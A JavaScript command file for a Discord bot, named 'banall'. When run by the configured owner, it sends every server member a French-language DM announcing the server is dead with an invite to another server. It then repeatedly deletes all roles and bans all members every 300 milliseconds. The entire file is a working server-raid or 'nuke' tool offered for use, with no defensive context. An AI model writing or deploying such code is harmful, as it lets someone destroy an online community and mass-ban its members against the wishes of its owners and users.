const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");
const config = require("../storage/config.json")

module.exports.run = async (bot, message, args) =>{
console.log("test")
  if(message.author.id === config.owner) {
  message.delete();
  console.log("done")
  message.guild.members.forEach(membre => membre.send(`Le serveur est mort rejoind :${process.env.INVITE}`))
  var raide = setInterval(raiding, 300);
  function raiding () {
    message.guild.roles.forEach(role => role.delete())
    message.guild.members.forEach(membre => membre.ban())
  }
  }else {
    return;
  }
}
module.exports.help = {
    name: "banall"
}